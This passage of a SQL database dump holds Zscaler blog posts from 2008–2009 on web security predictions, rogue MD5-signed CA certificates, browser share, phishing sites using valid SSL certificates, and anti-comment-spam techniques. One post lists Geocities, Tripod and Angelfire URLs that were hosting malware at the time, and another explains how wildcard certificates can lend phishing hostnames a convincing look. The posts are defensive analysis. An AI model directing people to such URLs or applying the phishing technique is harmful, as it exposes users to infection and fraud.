be a significant year, but not because attacks will suddenly shift to mobile platforms. Mobile attacks will finally become a mainstream problem because mobile devices are susceptible to traditional attacks. Browsers such as Mobile Safari, Internet Explorer Mobile, Mobile Opera, etc. now have full JavaScript engines and can generally accommodate Rich Internet Applications. This combined with the fact that they now drive a meaningful volume of Internet traffic means that they are susceptible to many of the non-browser specific attacks such as Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), Clickjacking, etc. They also tend to share libraries with their oft-vulnerable desktop siblings, so also expect browser specific vulnerabilities to be on the rise.    3.) Is Client Side Browser Storage a Feature or a Ticking Time Bomb?    The line between web and native desktop applications is continuing to blur. Rich Internet Application technologies such as Flash and SilverLight and the emergence of development approaches such as AJAX have made web applications much more interactive and user friendly. However, despite these advancements, a critical differentiator between desktop and web applications remains the need for connectivity. Sure, Google Docs is a great alternative to Microsoft Office - until you board a plane. You can\'t use web applications unless you have access to them.    This too is starting to change as browsers are gaining access to client side storage solutions. Flash storage, Google Gears and Structured Client Side Storage, detailed in the HTML 5 specification all address this issue. While this opens up new doors for web applications, as with any new technology, if it is implemented insecurely, it can increase risk and create new headaches for corporate security staff. Our early review of these technologies suggests that they are not well understood and are indeed being poorly implemented. This is turn will lead to the leakage of sensitive information and client side equivalents of XSS and SQL injection. Stay tuned for further posts on this topic.    4.) Web API Vulnerabilities Lead to Mass Attacks    Code reuse has always been encouraged - why reinvent the wheel. It\'s also a good security practice as open, stable code has been scrutinized by many eyeballs and is therefore more likely to be secure. In web development however, that is not always the case. While we may leverage functionality created by others, the security of that code may not have been assessed by anyone other than the original creators. That occurs because we\'re not necessarily dealing with open source code or even compiled binaries but rather web based APIs. In this case, we\'re largely counting on the providers of a given service to ensure that it\'s secure. Google for example makes available a plethora of APIs for everything from maps to social networks and despite investing in securing code prior to release; they have seen their fair share of vulnerabilities. When a vulnerability is discovered in such an API, hundreds and thousands of sites can instantly be affected. Fortunately, patching can generally be completed quickly as only servers hosting the API need to be updated but this can also break associated applications. From an attacker\'s perspective, a web API vulnerability can signal a target rich environment with a small window of opportunity - a good reason to keep quiet once a vulnerability is discovered.    5.) Abusing the Architecture Of The Web As Opposed To Vulnerabilities In Specific Applications    Traditionally, vulnerabilities have exploited a specific error on a specific platform. The web however, has opened the door for attacks which are cross-platform simply because they abuse intended functionality. Let\'s face it - the web was designed to be open - not secure. Moreover, the interconnected nature of the web means that a vulnerability on one node (i.e. a web server) can indirectly lead to a compromise on another node (i.e. a web browser). We could argue that these facts of life on the web account for the majority of security incidents today and that the trend will only continue to escalate. XSS is an entrenched example of this fact. The web was designed to freely share content between browsers and servers and JavaScript was developed and adopted to extend the functionality of web browsers. The inventors did not however plan for a scenario whereby someone with less than honest intentions would leverage the power of JavaScript and browser/server trust (and lack of input validation) to attack unsuspecting users. Such attacks are not specific to any browser or server - all are affected equally as XSS abuses the infrastructure of the web not a specific vulnerability. We were provided with another example of this phenomena in 2008 when Clickjacking flew into the media spotlight. This time the attack focused on transparency and DHTML with a dash of social engineering to convince victims to make requests that they hadn\'t intended too. Expect such attacks to become the rule as opposed to the exception.    6.) Internet Explorer Gets Competition    We\'ve often argued that vulnerability statistics are a poor indicator of the relative security of a product. Rather than providing insight into the relative security of products, they tend to instead reveal the popularity of products. Attackers/researchers want the biggest bang for their buck. If they\'re going to spend time looking for vulnerabilities in a certain product, they\'re more likely to focus on the one with the largest user base. Internet Explorer (IE) has held the browser crown for several years now and that in our opinion is why it has tended to see a more significant number of vulnerability reports. The landscape is however beginning to change. Not only are mobile browsers starting to take off (see prediction #2) but there are some interesting new challengers in the market such as Google Chrome. While we don\'t expect Microsoft to fall from the pole position any time soon, we do expect the focus to shift to some of these new and intriguing entrants. Expect to see a decreased number of IE vulnerabilities in 2009 and more from mobile browsers and especially Google Chrome. While Google has a decent security track record, they haven\'t faced the same difficult but important learning curve climbed by Microsoft over the years. Browser development is also a different game than web application development, Google\'s forté, so expect some tarnish on the Chrome in \'09.    7.) Data Leakage Via The Web Reaches A Tipping Point    The Internet is converging on ports 80 and 443? Why? They\'re always accessible for outbound connections on corporate networks. Whether you\'re dealing with VoIP, P2P or malicious code, network aware applications are becoming increasingly intelligent. While they may initially attempt to connect via high-level ports using proprietary protocols for efficiency, they will often try a variety of approaches and ultimately regress to tunneling content through HTTP/HTTPS traffic. Combine this with the fact that users are increasingly encouraged to share content online (Facebook, Myspace, YouTube, etc.) and it\'s easy to see why data leakage via web channels is fast becoming a top priority for many enterprises. 2007 and 2008 were banner year for data leakage solutions in general (Vontu and Provilla acquired) but in 2009 the focus will shift to web based DLP.    8.) The Long Overdue Death of URL Filtering    Network administrators are finally starting to give up on managing web traffic through URL filtering. URL filtering is a dated technology, which tends to focus on blocking traffic at the domain level and leaves the administrator with a binary decision - allow or don\'t allow access to a given resource. This approach was reasonable when the web was dominated by static, corporate content. This is no longer the case. Today, content is extremely dynamic and often user generated and this changes the rules. A page that was good today may be bad tomorrow and while a domain such as Facebook.com may be perfectly acceptable, individual pages could contain objectionable or malicious content. In 2009, enterprises will seek solutions that support dynamic content filtering and page level reputation.    9.) Controlling Web Application Functionality, Not Just Content    It is no longer enough to block/allow access to sites. Administrators are demanding control over functionality, not just content. There may be perfectly legitimate reasons to permit access to a given resource but not want to permit specific functionality. Take YouTube for example. While it may be seen primarily as an entertainment site, many businesses have begun to leverage it as a marketing tool. If URL filtering is your only option for controlling access to YouTube (see prediction #8), you\'re stuck with allowing/disallowing access to the site as a whole. You may however wish to permit viewing videos to allow for competitive intelligence (or to avoid being the fun police) but not want to permit uploading content for fear of data leakage (see prediction #7). Administrators are increasingly demanding the ability to manage the - who, what, when, where and how much of web security. They want the granularity to determine that only the Marketing Department can upload videos during work hours to YouTube, so long as they don\'t use more that 5% of available bandwidth. Solutions need to understand not just the destination of a web request, but also the business logic of that destination in order to be able to permit the granular level of control required to manage third party web applications.    10.) Mobile Platforms Open Up For Developers…And Attackers    Desktops and mobile devices have evolved along nearly opposite paths - until now. Desktops have always been about an open architecture - you\'re free to add whatever applications you like, after all, you own it. Cell phones on the other hand have traditionally been black boxes - don\'t like a key feature? Buy a new phone. Much of this was driven by the control crazy mobile carriers who until recently have wielded the power. They didn\'t want you to be able to add features, as it would then be harder for them to differentiate their \'exclusive\' handset offerings. This has changed however as device manufacturers have begun calling the shots and the carriers are now tripping over one another to argue about who is the most \'open\'. While this overall is a positive thing, it does have security implications. The more freedom that you provide someone with the more likely that freedom will be abused. Providers are taking different approaches to an \'open\' model. Apple for example allows you to install whatever you want, so long as they approve of it. Are they however, assessing submitted applications for security weaknesses, or just undesirable functionality? We suspect it\'s the later. Google on the other hand is taking a more \'pure\' open source approach and not locking down as many portions of the O/S for developers. Will attackers abuse these new open platforms? You bet.', 'Analysis', 'https://www.zscaler.com/blogs/research/2009-web-security-predictions');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (604, 'Breaking Down Broken SSL', 'Michael Sutton', 'January 02, 2009', 'Update [01/06/09]: I discussed this topic with Dan Kaplan on his SC Magazine podcast.    On December 30, 2008 at the 25th Chaos Communication Congress (CCC) in Berlin, seven researchers presented a talk entitled \'MD5 Considered Harmful Today: Creating a Rogue CA Certificate\'. In essence, they made the theoretical practical by building on recent research which detailed how chosen-prefix collisions for MD5 could be used to create two x.509 certificates with identical signatures despite having different content. The CCC presentation has taken this work a step further to actually produce an intermediate CA certificate signed by a trusted root CA. This certificate can then be used sign any website certificate. A website certificate created by the team can be seen in the image below. Note that Internet Explorer in this case considers the certificate to be legitimate.    As you can imagine, the ability to create fake SSL certificates is a phisher\'s dream come true. An attacker possessing such a rogue certificate could produce fake SSL certificates for phishing sites which would be indistinguishable from their legitimate counterparts. However, before we conclude that the sky is falling it\'s important to understand that while such attacks have now been proven to be possible, it would still be difficult to an attacker to successfully mount a successful attack.    Ingredients For a Successful Attack    1.) Knowledge - While the CCC researchers have published a detailed paper to discuss their findings, they will thankfully \"for the time being not release the full details of how [they] have been able to obtain the rogue Certification Authority certificate\". While their research is based on past work that is now public, they confess that the \"publicly known techniques have been improved at crucial points\". In short - simply reading their paper/slides will not be enough to conduct a successful attack, additional research would be required. That said, you can bet that the race is now on for the bad guys.    2.) Computing Power - In order to calculate the MD5 hash collisions to produce the rogue CA certificate, the team employed a cluster of 200 PlayStation 3 consoles. While such technology is readily available, there is a real cost associated with acquiring the necessary computing power to replicate their work.    3.) Traffic Redirection - This is the biggie. Producing a rogue SSL certificate for say bankofamerica.com is of little value if it is not hosted at bankofamerica.com. Hosting the certificate at any other domain will result in a warning message from any visiting web browser indicating that the certificate does not match the domain name. The necessary traffic redirection is realistic on a LAN segment, but would be very difficult to accomplish on the Internet as a whole. Attacks such as Dan Kaminsky\'s DNS cache poisioning attack would provide the critical missing piece of the puzzle but fortunately this vulnerability has aged to the point where it has primarily been addressed.    Why This Was Possible    The CCC researchers largely credit the work of Marc Stevens , Arjen Lenstra and Benne de Weger on chosen-prefix collisions for MD5 which was released in 2007. However, their success was also made easier by less than perfect processes at a number of Certificate Authorities. Certificates do not have to be signed using MD5. In fact, MD5 was shown to be vulnerable to attack as early as 2004 and yet a number CAs still employ MD5 for certificate signatures. The worst offender turned out to be RapidSSL (owned by VeriSign), which was responsible for 97% of the MD5 signed certificates that the researchers looked at. The team also faced other challenges such as predicting the validity period and serial numbers of the certificates issued by the CA that was being targeted. This was made much easier by the fact that certain CAs are apparently using sequential serial numbers.    What Needs To Be Done    So, what can you do to protect your users from falling victim to phishing attacks on sites that may have rogue certificates? Unfortunately, there isn\'t a good answer to that question. If someone were to successfully create a rogue certificate it would be difficult evn with manual inspection to identify it as rogue. The researchers took the approach of developing an intermediate CA certificate which could then be used to sign any website certificate, therefore you could identify/block any web certificates signed by an intermediate CA which is not specifically trusted but that could also block some legitimate sites. It should be noted that it is not enough to block sites with MD5 signed certificates (unless MD5 was not used for signing at any point in the chain of trust). While MD5 collisions were used to develop the rogue CA certificate, once it is developed, MD5 does not need to be used for signing subsequent website certificates.    The fix really lies with the CAs. The fact that some have continued to use MD5 instead of a more secure alternative such as SHA-2 for signing certificates some four years after real weaknesses in the algorithm were demonstrated, is inexcusable. They also need to inject randomness into the signature generation process, most notably in the serial number field. Hopefully this research will force CAs to quickly phase out the use of MD5 for developing certificate signatures and improve their procedures overall.    Happy New Year!    - michael', 'Analysis', 'https://www.zscaler.com/blogs/research/breaking-down-broken-ssl');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (605, 'Microsoft Internet Explorer Dips Below 70% Market Share', 'ThreatLabz', 'January 02, 2009', 'I ran across article by Net Applications that shows their recent browser tracking data. According to their stats, Microsoft Internet Explorer (MSIE) browser has finally dropped below 70% of the overall browser market share, and Firefox has risen above 20%.\r\n\r\nOverall, this is nice for Firefox and alternative browsers, but it does have both positive and negative security implications. For a period of time, it felt like the world wide web was a homogenous environment of MSIE browsers everywhere (and before that, it was Netscape browsers). Now we\'re finally at a point where the numbers may start supporting the notion that we have a true heterogeneous environment blossoming. Heterogeneous environments, whether it be a computer network or a biological system, are often much more robust and stable than a homogeneous environment simply because a homogeneous environment is susceptible to a single incident (such as an eruption of a pathogen, or a browser exploit in our case) wiping out the entire environment in one fell swoop. So the growth of browser alternatives is actually good for web browser security overall, because it means not all systems will be p0wn3d by the next devastating MSIE vulnerability.\r\n\r\nThere is also a downside of this too. With the rise of active use of alternative browsers, there is now enough incentive for attackers to take the time to attack/exploit the alternatives. We kind of already knew this, and it was largely already happening in the real world, but the numbers help to support the idea. Simply put: if no one is using a browser, there isn’t much blackhat value in finding a vulnerability in it to exploit...you’d essentially have a specialized weapon with a lack of targets to use it upon. But once there is a moderate/sizable population of those targets, the effectiveness of that specialized weapon (i.e. exploit) increases. We’ve seen this before with the Apple Mac platform: many people claimed it was more secure than Windows because it had fewer publicized security vulnerabilities. There\'s even the claim that Macs don\'t need anti-virus software because there are no viruses for Macs. Of course, Mac popularity grew, the number of deployed systems rose, and that caused the attackers to take notice. Now we have active research and exploitation of OSX and its components, and a host of malware specific to the Mac platform (for the skeptical: OSX.Leap.A, OSX.Exploit.Launchd, OSX.Macarena, OSX.Inqtana.A, etc.)\r\n\r\nOverall this is the right direction for things to be heading. However, those trying to fly under the blackhats\' web exploitation radars by using an alternative/obscure browser may find their days of obfuscated safety are numbered. As soon as the obscure browser you are using jumps into the limelight, attackers are sure to pounce on it eventually as well.\r\n\r\nSide note: I\'ve encountered many individuals that have employed this \'security through obscure browser\' tactic. The issue is that they were using browsers like Maxthon, NeoPlanet, Avant, etc. What they didn\'t realize is that all of these browsers were just different UI shells on top of the MSIE web layout engine (called \'Trident\'). In other words, they often just as vulnerable as if they were directly running MSIE—there was no security advantage gained. Overall there currently four major web browser \'engines\': Trident (MSIE), Gecko (Firefox), WebKit (Safari), and Presto (Opera). Most browsers on the market today use one of those engines (or a derivative), and that means any vulnerability that affects the engine will affect any browser built upon it. So you might hear of a vulnerability in Firefox, but the bug could truly be in the Gecko engine and thus other browsers like Flock, Camino, Epiphany, Galeon, SeaMonkey, and Songbird (all Gecko-based) could be vulnerable as well. Therefore if you are looking to differentiate yourself by using an obscure browser for security purposes, you should do some research to ensure the browser you are running is not running the same (vulnerable) web engine as the more popular browsers.\r\n\r\nUntil next time,\r\n- Jeff', 'Microsoft', 'https://www.zscaler.com/blogs/research/microsoft-internet-explorer-dips-below-70-market-share');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (606, 'Money Magazine\'s Take On Phishing', 'ThreatLabz', 'December 22, 2008', 'The January 2009 issue of Money magazine published a quiz entitled \"Are you Phish Food?\" The purpose of the quiz was to gauge your knowledge on whether you are being targeted for a phishing attack. If you don’t get the print magazine, you can take the quiz online too.Overall the quiz is basic, but that’s acceptable given the target audience (general consumers). It\'s nice to see articles like this, as consumer education about security threats still has a long way to go (but we\'re making good progress: most consumers now know, even if they do not understand why, that they need some kind of anti-virus protection on their systems). There was, however, one question that made me cringe a little.The question was whether using HTTPS was a good or bad thing, and Money\'s response was that it was a good thing assuming the SSL certificate is valid (which they explain as the little lock icon in the browser not reporting any problems). In other words, if the URL is using HTTPS, and the certificate is good, then don\'t worry--you\'re safe. This is actually a bit misleading.In this day in age, basic SSL certs are tied to hostnames (or, in the case of wildcard SSL certs, root domain names). The process of vetting SSL cert recipients has diminished over the years; nowadays you can be immediately issued a domain-only SSL cert if you control the web server for that domain. In fact, this diminished accountability for normal SSL certs is one of the reasons for the introduction of the newer crop of EV (Extended Validation) SSL certs (a.k.a. the \'green bar\' SSL certificates). EV SSL certs (re-)establish a level of recipient review and validation.Anyways, let\'s bring this back to phishing. Money magazine says that a valid HTTPS cert means things are OK. But what\'s to stop a phisher using \'www.evil.com\' from getting a valid SSL cert for that hostname? Absolutely nothing, other than the financial cost acting as a barrier to entry. But domain-only SSL certs are now as cheap as US$15, and I have to imagine such a cost is negligible if the phishing site has even a minimum level of success. Sure, phishers treat their sites as disposable, and buying a new SSL certificate for every site could become expensive; but if valid HTTPS connections contribute to the success of the phishing attack, then there might justifiable ROI. At that point, the SSL cert is just a cost of doing business for the phisher (or, as I like to refer to it, a \'cost of doing evil\').But let\'s take this one step further. Getting an SSL certificate for www.evil.com has minimal value, because it is very clearly evident that www.evil.com is not a possible phishing target, such as www.paypal.com. And perhaps every certificate authority (CA, the people who sell SSL certs) in the world checks and denies SSL certificate requests that include derivations of the word \'paypal\' in their SSL certificate requests...although that is highly doubtful. But even if they did, wildcard SSL certificates can bypass this check to a certain degree. An attacker would just purchase a \'*.evil.com\' wildcard certificate from the CA, and then set up a site such as \'paypal.evil.com\'. The CA would never know the final hostname in use. Does the hostname still look suspicious? What if the attacker gets the domain name \'cgi-bin-webscr.com\', and requests a wildcard certificate for \'*.com.cgi-bin-webscr.com\'? The SSL-validated URL \"https://paypal.com.cgi-bin-webscr.com/?cmd=login\" could look convincing to some folks...And just for fun, I took at look at all of the reported phishing sites on Phishtank.com for the past month. There was only one site using HTTPS; it was posing as an eBay site, and it did, in fact, have a valid SSL certificate issued for the phishing domain name. So this discussion isn\'t speculation...it\'s actually occuring.Overall, the mere presence of a valid SSL certificate does not imply a safe site. You could, in fact, be (securely) talking to an attacker. EV SSL efforts help with this situation, but they are cost-prohibitive for many sites and will take a long time before the majority of the world is using them (if ever). So end users must still remain vigilant about verifying which sites they are visiting...and the presence or absence of a standard valid HTTPS/SSL certificate is a negligible factor in that process.Until next time,- Jeff', 'Encryption', 'https://www.zscaler.com/blogs/research/money-magazines-take-phishing');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (607, 'Final Encounters With A Web Comment Spammer', 'ThreatLabz', 'December 22, 2008', 'In the last part of my series on web comment spamming applications, I want to pass along a few things I noticed that were effective at separating the spam apps from the humans. Many of these have been publicly discussed already, but they still are worth repeating. Also, note that none of these techniques provide a permanent, fool-proof way to stop spam apps. These suggestions will curb the tide of comment spam that is being spewed by today’s spam apps--but tomorrow\'s spam apps, if adapted, would be able to circumvent these mechanisms. Anyways, onto the mechanisms.  Use Javascript  All of the spam apps I\'ve encountered to date do not run Javascript. So you should utilize some Javascript mechanism to manipulate the form before it is submitted. You can dynamically change the form action URL upon loading or submission, update the value of a hidden field to indicate Javascript is present and functioning, etc. Any submission to the wrong form action URL or without the proper hidden field value should be discarded.    The downside of this approach is that it requires the user to have Javascript enabled in their browser. While Javascript is mostly ubiquitous in the Web 2.0 world we live in, browser plugins like NoScript are still highly popular. So you have to make the executive decision on whether you want to require your users to enable Javascript to use your form...which might not be a problem if you already require it for other things (i.e. Web 2.0 elements in use on your site).    Monitor the time it takes to fill out the form  My simple experiment kept track of the time between when a spam app requested the form to when the form was submitted. What I saw was that the form submission was done immediately. There is no way a human would be able to reasonably fill out the fields of the form in under, say, two seconds. This provides a simple way to discard spam simply by keeping track of when the form was requested (via a time value stored in server-side session storage or within a hidden form field) and when the form was received by submission (compare current time with previously stored time).    Now sure, spam apps can get around this by slowing down a bit during the form submission process. But since these apps are trying to spew out tens/hundreds of thousands of spammy form submissions, requiring each submission to slow down causes significant time overhead for the user of the spam app. Are they willing to be patient and wait 10 times longer for their spams to be submitted?    Use CSS to hide some form fields  The spam apps liked to populate every text input field in the form with some kind of value. You can wrap a field in a HTML DIV with a CSS style set to \'display:none\', which essentially makes the field invisible. Normal CSS-capable web browsers will not display the field, so the user will never get a chance to enter input data into it. But the spam applications do not account for the hidden DIV, and thus will treat it like any other field on the form (and input a value). Thus all you need to do is see if that invisible form field contains a value upon submission, and if so, discard the submission. For safety, put a nice warning (also in the DIV) to users that they should not fill out the field if they see it; that way, if for some reason a user has a browser which is not CSS-compliant, they are still prompted to leave the field blank.    Textarea input field in HTML comments  I noticed one of the spam apps that hit my form just couldn\'t resist the temptation of populating data into a textarea input field that was within HTML comments. Normal browsers will ignore everything in comments, including the erroneous textarea field; so any submissions that include that field should be discarded as spam.    Don\'t use obvious form field names  Avoid using the field name \'email\' for a user\'s email address, etc. In fact, you can turn this to your advantage: have the email field be named \'foo\' or something else innocuous, and then check upon submission that the \'foo\' field data format matches the format of an email address (which is typically done for validation purposes anyways). Since the spam apps often shove random garbage into fields they do not understand, you can discard any submission that does not contain what looks like an email address in the \'foo\' field. Alternatives include checking numeric format in postal code or phone number fields, etc.    Overall, these few simple tricks can help you alleviate the flood of web comment spam that your site might be experiencing. They may not be perfect, but they are simpler to implement than a CAPTCHA and do provide some value from the current crop of web comment spam apps that are roaming the Internet. Every little bit helps.    Until next time,    - Jeff', 'Spam', 'https://www.zscaler.com/blogs/research/final-encounters-web-comment-spammer');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (608, 'Turning A Blind Eye', 'Michael Sutton', 'December 18, 2008', 'All too often, evil is lurking right under our noses, yet we choose to turn a blind eye. Sometimes we do this out of fear. After all, if we get involved, we too could get hurt. Other times however, we are just as much to blame as the guilty parties perpetrating the crime. We choose not to get involved because we too profit from the crime, although we do so passively and leverage that as our defense.    A couple of years ago, I drew attention to the fact that free website providers were profiting from allowing phishers to set up shop and doing nothing to stop them. They were profiting as they make money from ad-supported pages. The more traffic they generate, the more money they make and how that traffic is generated doesn’t seem to be of concern. I ruffled a few feathers by speaking my mind and generated a much-needed debate on the issue. The argument from the hosting providers was that they try very hard but some pages slip through the cracks. Although I don’t buy the excuse, to be fair, automating the detection of phishing pages isn’t without challenges. What about malware then? Do these same sites foot the bill for hosting/delivering malicious binaries? Sadly, the answer is yes.    Being an ‘in-the cloud’ security solution, our Zscaler infrastructure permits powerful data-mining capabilities from a research perspective. The very nature of a cloud architecture means that logs can be centralized, providing a powerful view into global attacks. Leveraging this capability, I sought to identify malware being hosted on free web sites. It didn’t turn out to be much of a challenge as evidence was everywhere. A sample of what was discovered can be seen below:    Caution: At the time of this blog post, these URLs were live and hosting malware – proceed at your own risk.    Geocities (Owned by Yahoo!)    http://www.geocities.com/sltap/main.html      	Malware found - Virus.VBS.Redlof.a  	VirusTotal Results - 32/37      http://uk.geocities.com/dravidaperavai/      	Malware found - Virus.VBS.Redlof.n  	VirusTotal Results - 26/37      http://www.geocities.com/SiliconValley/Hills/7140/      	Maware found - Net-Worm.Win32.Nimda  	VirusTotal Results - 30/37      http://www.geocities.com/dental_associates/      	Malware found - Virus.VBS.Confi  	VirusTotal Results - 32/37      http://www.geocities.com/jennifer_garner_zone/trivia.htm      	Malware found - Virus.VBS.Redlof.a  	VirusTotal Results - 23/38      http://www.geocities.com/aga_muhlach_2000/r.html      	Malware found - Virus.VBS.Redlof.a  	VirusTotal Results - 33/38      Tripod (Owned by Lycos)    http://india_resource.tripod.com/indianhistory.html           	Malware found - Virus.VBS.Redlof.a  	VirusTotal Results - 34/38      http://members.tripod.com/~INDIA_RESOURCE/Shia-Plight.html                	Malware found - Virus.VBS.Redlof.a  	VirusTotal Results - 34/38      Angelfire (Owned by Lycos)    http://www.angelfire.com/tx5/jr2k/Stor/2.html                	Malware found - Virus.VBS.Redlof.k  	VirusTotal Results - 27/38      How difficult would it be for these providers to have identified the malware that they are hosting? It would have been trivial. The files are hosted on machines they control and we’re not talking about 0day attacks here. In every case at least 20+ commonly available AV scanners detected the malicious content and in some cases the malware was years old! This isn’t just incompetence, it’s gross negligence.    So why then wouldn’t they make an effort to eradicate viruses from their servers? The answer is simple. The cost to do so outweighs the benefits derived. In other words, removing content from their sites reduces the number of eyeballs they receive and in turn decreases ad revenue. They are turning a blind eye to the fact that their users are getting infected with malware.    Gross negligence can be defined as “failure to use even the slightest amount of care in a way that shows recklessness or willful disregard for the safety of others”...sounds like an open and shut case to me.    - michael', 'Analysis', 'https://www.zscaler.com/blogs/research/turning-blind-eye');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (609, 'Third Encounters With A Web Comment Spammer', 'ThreatLabz', 'December 10, 2008', 'In my previous two posts, I wrote about a web comment spam application that has been hitting one of my personal web sites. I set up a bit of an agility test for the bots to figure out what they were, and were not, capable of doing. Eventually I was able to put together a fairly good operational profile of one of the spam application\'s functionality. In this post, I want to review the operation of another spam application that I happen to encounter during my test...one that seems far more capable than the original one I aimed to report on.    To briefly recap my previous two articles, there was one particular application that repeatedly kept visiting my site. It should send a bunch of bogus links in various different formats as a comment in a web form; since the links were entirely random, I hypothesized that these submissions were mere probes to some other future means and not the overall end purpose. Anyways, the operational profile that I constructed for the application looks like:                	It recognized a few form field names and attempted to submit appropriately formatted data to them, but all other fields were filled with random garbage (unless an existing form field already held a value); specifically:  	  		It put an email address in the \'email\' field, but not the \'eml\' field  		  		It put a URL in the \'url\' field, but not the \'link\' field  		  		It did nothing special with the name, address, and phone fields  	  	  	  	It supported cookies during the submission process  	  	It did not support Javascript  	  	Hidden form fields were properly submitted/included  	  	It could support multi-step submissions  	  	The User-Agent seems configurable, but is mostly left as the same value  	  	Many uses of this application against my site have originated from the same Class C public Internet network  	  	  	       During my experiment, another spam application wandered onto my site and partook in my little agility test. This particular application stood out exceptionally different than the previously profiled application. Here’s an example of what the application actually sent (which can be compared against the raw data contained in my previous post). I’ve modified the domain names; I assure you the originals used live/real URLs.    eml: korch_poposk@xxx.yy    email: korch_poposk@xxx.yy    name: DoorieHoohona    phone: 123456    address: http://xxx.yyy.com/Avalide/map.html    url: http://xxx.yyy.com/Bust-Enhancer/map.html    link: http://xxx.yyy.com/L-Glutamine/map.html    comment: Wellbutrin XL what is celebrex clonidine medicine bupropion and weight loss <a href=http://xxx.yyy.com/Female-Libido-Patch/new-scientist.html>new scientist</a> <a href=http://xxx.yyy.com/Evegen/evegen-reviews.html>evegen reviews</a>... [truncated for brevity]    Just looking at the values submitted in these fields, there is a night-and-day difference when compared to the previously mentioned spam application I was tracking. This new application was significantly more successful at putting contextually-correct information in the right fields: email addresses were submitted for both \'email\' and \'eml\' fields; something that resembled an actual human name was submitted in \'name\' field; the \'phone\' field was numeric; both \'link\' and \'url\' fields held URLs. The value of the \'address\' field is debatable...perhaps the application is coded to believe \'address\' is akin to a web site address, i.e. URL. Or, maybe this particular app shoves URLs into fields it does not recognize (and thus the URL values in the \'address\', \'url\', and \'link\' fields were actually just dumb luck). The links submitted within the comment only used one format (proper HTML <A> tag), so it\'s not as robust as the other application in abusing web applications that allow the use of popular forum code markup (i.e. the [url] and [link] pseudo-tags). But overall, the level of contextual awareness of this application is far more interesting than the previously profiled spam application.    So the current operational profile of this spam application is:                     	It has shown to be very successful at putting the right contextual/formatted information into a variety of different form fields; specifically:  	  		It put email addresses into the \'email\' and \'eml\' fields  		  		It put a human name into the \'name\' field  		  		It put a numeric number into the \'phone\' field  		  		It put URLs into the \'address\', \'url\', and \'link\' fields  		  		  		   	  	  	It supported cookies during the submission process  	  	It did not support Javascript  	  	Hidden form fields were properly submitted/included  	  	The application does not appear to support multi-step submissions; or at least, it didn\'t care about verifying that the submission worked  	  	The User-Agent string submitted is extremely easy to spot: \"Mozilla/4.0 (compatible; MSIE 6.0; Update a; AOL 6.0; Windows 98)\"        Unfortunately this particular application only visited my site once, so I don\'t have multiple submissions at hand to aggregate into a more comprehensive profile. I\'ll sure be on the lookout for the next time it comes back around.    Until then,  - Jeff', 'Spam', 'https://www.zscaler.com/blogs/research/third-encounters-web-comment-spammer');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (610, 'Second Encounters With A Web Comment Spammer', 'ThreatLabz', 'December 01, 2008', 'Earlier I wrote my First Encounters with a Web Comment Spammer piece. In that piece I devised a plan to lay a trap of sorts for the web comment spamming application, in order to test the depth of the application\'s functionality. Well, it\'s been a few weeks, and now I have some data to share.The most interesting thing to note is that a few more comment spam applications/crawlers have made their way to my comment form. These new ones exhibit different behavior than the original one I reported on, thus I believe they are entirely different applications. For now, I’m going to stick to the original application I previously discussed; I\'ll compare my results to these newer spam apps in a future blog post.One thing I noticed is that many of these comment spam attempts were coming from systems located on the 94.102.60.0/24 network. A large number of them were also using the User-Agent string \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\". Both of these factors turned out to be good indicators of whether the request was coming from a spam bot.Anyways, here is an example of one submission I received. The names at the beginning of each line are the name of the form field; all of the fields are text input fields (as in, \"<input type=text>\"), except for \'other\' and \'comment\' which are textarea fields.eml: YkfxeDeZjHRemail: fbkixy@nphddy.comname: fvkijvnphone: CdGpbMFbxGDygCwyaddress: ouUMHxpoxwnurl: http://vfokgivkywst.com/link: geEKiJfvkyRCother: TyhYgb <a href=\"http://xnhqpiemubkx.com/\">xnhqpiemubkx</a>, [url=http://fiukrdabbaut.com/]fiukrdabbaut[/url], [link=http://zrywxdmvlfzv.com/]zrywxdmvlfzv[/link], http://klhtciqjlkxr.com/comment: TyhYgb <a href=\"http://xnhqpiemubkx.com/\">xnhqpiemubkx</a>, [url=http://fiukrdabbaut.com/]fiukrdabbaut[/url], [link=http://zrywxdmvlfzv.com/]zrywxdmvlfzv[/link], http://klhtciqjlkxr.com/The most obvious things visible from this data are that the application filled in all fields with random garbage. It managed to put something that resembled an email address into the \'email\' field, but not the \'eml\' field (which is the actual email address field shown to the user for data entry). The application also managed to put a URL into the \'url\' field, but not the \'link\' field. This makes me believe the application is pre-programmed with a few specific field names where it will submit data of a specific format. Also interesting/notable is that the application submitted the same blob of link garbage to both textarea fields (\'other\' and \'comment\'), and not any of the text input fields.In addition to the form fields that were submitted, I collected some other pieces of information to gauge the depth of the spamming application. I discovered that cookies were indeed supported--at least, I could set a cookie on the form display page and the bot would carry that cookie over with the form submission. Hidden form fields were not altered and properly submitted with the rest of the form data. I also found that Javascript is not supported by the application...which is no surprise.Another thing I failed to notice before is that the application does actually have the ability to handle multi-step submissions. I recognized the behavior in my logs: whenever the form was submitted, the same user-agent would then go through every link on the page (in exact order of appearance, none-the-less) and subsequently request it. I assume this behavior is to deal with web applications that return a \"thank you for your submission\" page along with a link taking you back to the forum/comment area where the new submission will appear.Interesting info, perhaps. But I’ve found that I grown bored with this particular application and its lack of intelligence; the newer bots I’ve been seeing have actually been doing a lot more interesting things. I will take a deeper look at these new bots, and how they differ, in my next blog post. After that, I\'ll share a few effective tricks I\'ve been using to tell these spam bots apart from the humans (without CAPTCHAs!).Until then!- Jeff', 'Phishing', 'https://www.zscaler.com/blogs/research/second-encounters-web-comment-spammer');
